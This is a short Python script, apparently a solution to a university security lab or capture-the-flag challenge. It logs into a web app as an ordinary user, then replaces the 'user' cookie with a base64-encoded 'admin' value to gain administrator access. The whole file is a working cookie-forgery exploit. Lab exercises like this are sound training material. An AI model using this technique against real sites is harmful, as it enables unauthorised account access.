import requests

session = requests.Session()
site = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22056/'
response = requests.get(site)

print(response.text)

random_user = {'username': 'random'}
response = session.post(site, data=random_user)
cookie = response.cookies

print(response.text)

cookie.set('user', 'YWRtaW4=')

print(requests.get(site, cookies = cookie).text)